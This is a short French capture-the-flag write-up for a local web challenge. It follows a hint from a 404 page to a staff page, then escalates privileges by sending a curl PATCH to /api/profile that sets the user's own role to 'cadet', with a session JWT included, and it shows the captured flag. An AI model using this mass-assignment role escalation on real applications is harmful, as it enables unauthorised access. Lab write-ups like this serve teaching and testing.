
Si on tente d'aller sur une page qui n'existe pas "http://localhost:4942/test"

On a cet ecran :

![alt text](image.png)

Qui nous suggere d'aller sur "http://localhost:4942/staff"

Sur cette page, on a le texte suivant: "Cadet access required. Try PATCH /api/profile with the right fields."

On peut essayer de surcharger notre propre role avec:

   ```
    curl -s -X PATCH http://localhost:4942/api/profile \
     -b "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ6NHAxY254NDdtZnk1MGYiLCJsb2dpbiI6Impkb2UiLCJyb2xlIjoic3R1ZGVudCIsImV4cCI6MTc5MzY5OTAxN30.sZ4Hsg_ab0Arn6E7sTqurNL2l9h0pFrcbaOaA8e00es" \
     -H "Content-Type: application/json" \
     -d '{"role":"cadet"}'
   ```

Une fois Cadet, dans l'onglet Staff Area > Staff Dashboard on a :

    ```
        FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
    ```